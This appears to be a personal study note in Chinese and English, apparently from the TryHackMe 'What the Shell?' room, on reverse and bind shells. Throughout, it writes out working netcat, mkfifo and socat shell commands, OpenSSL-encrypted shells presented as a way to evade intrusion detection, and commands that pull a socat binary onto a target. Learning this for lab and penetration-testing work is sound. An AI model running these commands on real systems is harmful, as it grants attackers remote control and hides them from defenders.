---
title: Shell

---

# Shell
> bash or sh programs in Linux and cmd.exe or Powershell on Windows.

[TOC]

## Type of shell
* Reverse Shell
* Bind Shell

## Tools
* Netcat
    * Shells are unstable by default.
    * Have .exe version
* Socat
    * superior than netcat
    * more difficult and rarely installed by default
    * Have .exe version
* Metasploit -- multi/handler
    * In the auxiliary/multi/handler module
    * The easiest way to handle staged payloads.
* Msfvenom
    * generate payloads immediately

## Interactivity

* Interactive 
> 像是Powershell, Bash, Zsh, sh或是任何的standard CLI environment都是interactive shells. <br> 這類的shell讓你可以在執行程式後和程式做互動 <br> ![](https://i.imgur.com/5ixb5t3.png) <br> 上圖中的ssh程式就是一種互動式程式
* Non-Interactive
> 在這類Shell中，使用者被限制在只能執行非互動式的程式，否則程式無法正常運作。<br> <font color=#FF0000>絕大多數的簡易Reverse Shell和Bind Shell都屬於非互動式的Shell</font> <br> ![](https://i.imgur.com/Gy6eAzw.png) <br> 上圖中的whoami指令是屬於非互動式的，所以在執行上不會有任何狀況發生，但如果執行ssh指令(或任意互動式指令)並不會回傳任何內容，可以看出互動式程式在非互動式的shell中是沒辦法運作的。<br> [圖中listener的定義](##語法解釋) 



## Reverse Shell
:::success
從target連回attacker  `比較常見`
:::
* A good way to bypass firewall rules 
(防火牆規則會限制port的連線)
* Whe receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell.
(必須對自己的網路做設定並同意靶機的連線)

範例如下:
**<font color= #FF0000>Attacker</font>**
```shell=
sudo nc -lvnp 443 #attacker
```

**<font color=#FF0000>Target</font>**
```shell=
nc <LOCAL-IP> <PORT> -e /bin/bash #target
#通常Target端是在web端透過code injection來實現這行指令
```

**(左Attacker 右Target)**
![](https://i.imgur.com/jZXOhAY.png)

從圖中可以看出Reverse Shell是<font color=#FF0000>**先**</font>從攻擊機開始監聽並從目標機送出連線請求。


## Bind Shell
:::success
從attacker連到target `很少使用，但很有用`
:::
* Be opened up to the internet.
(代表可以連上用惡意程式打開的port並且達到RCE的效果)
* It may be prevented by firewalls.

範例如下:
**<font color=#FF0000> Target </font>**
```shell=
nc -lvnp <port> -e "cmd.exe"
```

**<font color=#FF0000> Attacker </font>**
```shell=
nc MACHINE_IP <port>
```

**(左Attacker 右Target`Target為Windows機`)**`這裡開啟監聽的指令並不局限於Windows`
![](https://i.imgur.com/pspQ3xu.png)

從圖中可以看出Bind Shell是<font color=#FF0000>**先**</font>從Target開始監聽後並從攻擊機連回目標機。

## Netcat shell stabalisation
1. Python
    > [color=#4cc6d3] `linux only` <br> Three stage process:<br>1. `python -c 'import pty;pty.spawn("/bin/bash")'`<br>透過python生成一個更好的bash shell，在某些目標上會需要指定python版本(將`python`替換為`python2`或是`python3`)，此時的shell雖然好一點了，但依舊無法透過`tab`來自動完成和上下鍵且`Ctrl + C`一樣會中斷shell。<br> 2.`export TERM=xterm`<br>這行指令會提供我們使用術語指令的權限，像是`clear`<br>3.`Ctrl + Z`<br>先把這個程式(這裡指shell)暫停後丟到後台，此時就會回到原本的terminal。<br> `stty raw -echo` <br> 這行指令會把當前terminal的echo功能關閉(功能包含tab autocompletes, the arrow keys, and Ctrl + C to kill process)<br> `fg` <br>最後使用fg指令把後臺的指令拿到前台來執行。<br> 這時接回來的shell就是可互動式的了。<br>範例如下:<br>![](https://i.imgur.com/fueD3uo.png)<br>可以看到上圖在執行完三個步驟後就能使用ssh(互動式)指令了。
    :::info
    需要注意的是如果shell停止運作的話(圖中netcat連過去得到的shell)，此時會回到自己的terminal，如果你嘗試輸入到terminal內的話會發現畫面上不會顯示任何內容，原因是因為在步驟3把echo給disable了，如果要解決這個問題只需要輸入<font color=#FF0000>`reset`</font>後按下enter即可。
    :::
2. rlwrap
    > [color=#49ed82]rlwrap是一個軟體可以讓我們在收到的shell中查看歷史指令, tab autocompletion, the arrow keys等，但如果想在shell中使用`Ctrl + C`還是需要額外步驟。<br> 在Kali中rlwrap不是預設安裝的，要使用必須先安裝。<br> `sudo apt install rlwrap`<br>使用方式如下:<br>`rlwrap nc -lvnp <port>`<br>透過rlwrap拿到的shell擁有更完善的功能，這技巧對Windows shells非常有用，因為Windows shells很難穩定(stabilise)，如果是Linux target的話可以進一步達到completely stabilise，只需重複上一個技巧的步驟三即可。

3. Socat
    > [color=#1a6fa8] `Linux targets only`<br><font color=#FF0000>Socat shell在Windows上並不會比netcat shell來的穩定。</font><br> 在使用這個方法前必須先將[socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)上傳到目標機上，簡單的實作方法是在攻擊機上擁有socat binary的資料夾中開啟webserver後再從netcat shell下載檔案。<br>`sudo python -m http.server 80`<br>在Linux上下載檔案可用curl或wget:<br>`wget <LOCAL-IP>/socat -O /tmp/socat`<br> 在Windows上可透過Powershell來達成，使用的是Invoke-WebRequest或是一個webrequest system class(取決於Powershell的版本):<br>`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`<br>
:::info
如果要使用會覆蓋掉整個畫面的text editor(像是vim, nano)，在一般的terminal中會自動的變更，但在Bind/Reverse shell中必須手動設置。<br>做法如下:<br>打開一個新的terminal後輸入`stty -a`，接著會收到很大量的內容，我們的目標是<font color=#FF0000>**rows**</font>和<font color=#FF0000>**cols**</font>後的值，接著回到bind/reverse shell中，輸入`stty rows <number>`和`stty cols <number>`(將先前看到的值和<number>交換)。<br>這會改變terminal的width和height，這樣就能正確的開啟text editors。
:::

## Socat
> Socat is a connector between two points.

### Reverse shell
:::info
從攻擊機開始監聽後由目標機連回。
:::
**<font color=#FF0000>Attacker</font>** `Linux和Windows都適用`
```shell=
socat TCP-L:<port> - #和nc -lvnp <port>一樣
```
**<font color=#FF0000>Target</font>**
`Windows`
```shell=
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```
這裡的pipes能強制powershell(或cmd)使用Unix系統的標準輸入和輸出。
`Linux`
```shell=
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

### Bind shell
:::info
從目標機開始監聽後由攻擊機連回
:::
**<font color=#FF0000>Target</font>**
`Linux`
```shell=
socat TCP-L:<PORT> EXEC:"bash -li"
```
`Windows`
```shell=
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```
**<font color=#FF0000>Attacker</font>** `Linux and Windows`
```shell=
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

### Stable reverse shell `Linux`
**<font color=#3346FF>Attacker</font>**
```shell=
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
其中``FILE:`tty`,raw,echo=0``相當於`Ctrl + Z` + `stty raw -echo;fg`，以此拿到stable shell。<br>不過socat在大部分的機器上都不會有預設安裝，這時只要上傳先前提到的[socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)上傳到目標機上就能正常執行了。

**<font color=#3346FF>Target</font>**
```shell=
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
`EXEC:"bash -li",pty,stderr,sigint,setsid,sane`這行指令會開啟一個interactive bash session並且附帶5個參數。
* **pty**: allocates a pseudoterminal on the target -- part of the stabilisation process
* **stderr**: makes sure that any error messages get shown in the shell(often a problem with non-interactive shells)
* **sigint**: passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
* **setsid**: creates the process in a new session
* **sane**: stabilises the terminal, attempting to "normalise" it

範例如下:
**(左Attacker 右Target)**<br>![](https://i.imgur.com/5nYNRh0.png)
一開始我們必須在攻擊機開啟兩個listener，圖中左邊為socat的(用來接fully interactive shell)，右邊的為netcat的(用來接non-interactive shell)。<br>先從目標機連回netcat shell(圖中的右方)，圖中有看到能正確回傳shell即代表已經成功拿到reverse shell，此時透過這個shell輸入上方socat的指令(Target)，可以發現圖中左邊成功接收到一個fully interactive bash shell。<br>若要再更進一步的做優化則可以透過上面提到的修改stty的值，接著就可使用像是Vim或Nano等文字編輯器了。

:::info
如果socat shell沒有正確運作，可以試著在指令加上`-d -d`，這樣可以拿到較詳細的資訊。
:::

## Socat Encrypted Shell
加密的shell可以避免被監聽，同時也是種繞過IDS(Intrusion Detection System)的方法。<br>簡單來說，要達到加密的方法可以將上述TCP出現的地方都替換為`OPENSSL`。<br>在使用加密shell之前我們必須先產生一個certificate(覺得怎麼翻都怪怪的所以選擇直接寫原文)。<br>做法如下:<br>`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`<br>這段指令產出一個以cert file形式的2048 bit RSA Key，效期為1年。<br>當你執行這行指令時他會要你輸入certificate的資訊，這些資訊可以是空白或是任意內容。<br>接著我們要將這兩個檔案合併到一個`.pem`檔中，<br>`cat shell.key shell.crt > shell.pem`<br>這時我們啟動reverse shell listener<br>`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`<br>指令中的`verify=0`告訴連線不要嘗試驗證certificate有沒有正確的被認可的機關簽名。<br>接著我們連回已開啟的listener:<br>`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`<br>同樣的也適用在bind shell。<br>Target:<br>`socat OPENSSL_LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`<br>Attacker:<br>`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`<br><font color=#FF0000>這裡要注意的是certificate必須跟listener一起使用，所以在bind shell環境中必須先將PEM file上傳到target才行。</font><br>以下為Reverse shell的範例<br>![](https://i.imgur.com/98q9AzP.png)<br>左圖為攻擊機，照著上方的步驟，先產生cerficate的必要檔案後合併完，接著以socat encrypted shell的方式開啟listener，最後再以右圖的方式連回來。<br>先前提到的tty shell的技巧也能在這使用。

Q.
:::spoiler What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"
`socat openssl-listen:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0`
:::
:::spoiler If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
`socat openssl:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
:::
    
## Common Shell Payloads (筆記整理未完全)
在****少部分****的netcat版本中有`-e`的選項可以讓你再啟動listener時執行一個程式。<br>範例如下(bind shell):<br>
```shell=
nc -lvnp <PORT> -e /bin/bash
```
(reverse shell):<br>
```shell=
nc <LOCAL-IP>
```
但是這在大部分的版本中並沒有，因為netcat認為它並不安全。<br>在總是需要static binary的Windows中，這項技術能完美運行。<br>但是在Linux中我們需要使用以下的code來產生bind shell<br>
```shell=
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
named pipe參考文章:https://www.linuxjournal.com/article/2156<br>
`2>&1`<br>
File descriptor 1 => standard output (stdout)<br>
File descriptor 2 => standard error (stderr)<br>
`2>1` 將stderr重新導向到名稱為1的檔案<br>
`2>&1` &表示優先辨識為file descriptor<br>
參考文章：https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean<br>


## 語法解釋
 
```shell=
nc -lvnp <port> -e "cmd.exe"
```
1. nc --> netcat 縮寫
2. -l --> listen mode
3. -v --> verbose (use twice to be more verbose)
4. -n --> numeric-only IP address, no DNS (只接受IP，不接受Domain Name)
5. -p port --> local port number (can be individual or ranges: low-high `inclusive`)
6. -e filename --> specify filename to exec after connect (例子為連線後執行cmd.exe)
:::info
port的選擇可以任意，但低於1024的port號需要管理員權限(sudo)
:::

**<font color=#FF0000>截圖中的listener是以下指令的alias</font>**
```shell=
sudo rlwrap nc -lvnp 443 
```
1. [rlwrap](https://github.com/hanslub42/rlwrap) --> 一種readline wrapper，讓使用者可以透過任意按鍵修改指令(像是上下鍵找之前的指令)。

```shell=
nc <target-ip> <chosen-port>
```
1. 使用netcat連回目標機上我們開啟的監聽端口


## Reference
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [Reverse Shell Cheatsheet  —  The PentestMonkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [SecList](https://github.com/danielmiessler/SecLists)
* [Shell Scripting – Interactive and Non-Interactive Shell](https://www.geeksforgeeks.org/shell-scripting-interactive-and-non-interactive-shell/)
* Kali linux -- /usr/share/webshells
* TryHackMe -- What the Shell?
